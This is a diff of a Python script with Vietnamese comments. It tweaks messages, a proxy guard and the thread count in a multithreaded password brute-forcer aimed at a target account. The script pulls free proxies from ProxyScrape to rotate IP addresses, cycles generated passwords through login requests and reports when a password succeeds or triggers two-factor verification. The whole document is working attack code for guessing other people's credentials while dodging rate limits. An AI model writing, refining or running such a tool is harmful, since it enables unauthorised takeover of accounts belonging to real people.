@@ -3,6 +3,7 @@ import requests
 import threading
 import queue
 import random
+import json
 
 # Các ký tự để thử trong mật khẩu
 characters = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890.?!@"
@@ -19,7 +20,7 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 }
 
-# Lấy danh sách proxy từ ProxyScrape
+# Hàm lấy danh sách proxy từ ProxyScrape
 def get_proxies():
     try:
         response = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
@@ -27,7 +28,7 @@ def get_proxies():
             proxies = response.text.splitlines()
             return proxies
         else:
-            print("Lỗi khi lấy danh sách proxy")
+            print("Không thể lấy danh sách proxy")
             return []
     except requests.RequestException as e:
         print(f"Lỗi khi lấy proxy: {str(e)}")
@@ -35,6 +36,8 @@ def get_proxies():
 
 # Hàm thực hiện đăng nhập
 def login(target, password, proxies):
+    if not proxies:
+        return -1  # Không có proxy để thử
     proxy = random.choice(proxies)
     proxies_dict = {
         'http': f'http://{proxy}',
@@ -55,7 +58,7 @@ def login(target, password, proxies):
             return 2  # Tài khoản yêu cầu xác minh 2 lớp
         return 0  # Đăng nhập thất bại
     except requests.RequestException as e:
-        print(f"Lỗi: {str(e)}")
+        print(f"Lỗi khi gửi yêu cầu: {str(e)}")
         return -1  # Lỗi trong quá trình gửi yêu cầu
 
 # Hàm sinh mật khẩu
@@ -78,7 +81,7 @@ def worker(target, proxies):
             result_queue.put(f"[+] Thành công! Mật khẩu: {password}")
             break
         elif result == 2:
-            result_queue.put(f"[!] Tài khoản bị khóa với xác minh 2 lớp. Mật khẩu là: {password}")
+            result_queue.put(f"[!] Tài khoản yêu cầu xác minh 2 lớp. Mật khẩu đã thử: {password}")
             break
         password_queue.task_done()
 
@@ -87,10 +90,10 @@ def Main(target):
     proxies = get_proxies()  # Lấy danh sách proxy từ ProxyScrape
 
     if not proxies:
-        print("Không có proxy, thoát chương trình.")
+        print("Không có proxy nào, thoát.")
         return
 
-    num_threads = 25  # Tăng số lượng luồng để thử nghiệm
+    num_threads = 10  # Số luồng để thử nghiệm
 
     # Tạo luồng thử mật khẩu
     threads = []
@@ -105,7 +108,7 @@ def Main(target):
     pw_gen_thread.daemon = True
     pw_gen_thread.start()
 
-    # Đợi cho tới khi có kết quả
+    # Đợi cho tới khi tìm được mật khẩu hoặc có kết quả
     while result_queue.empty():
         threading.Event().wait(1)
 
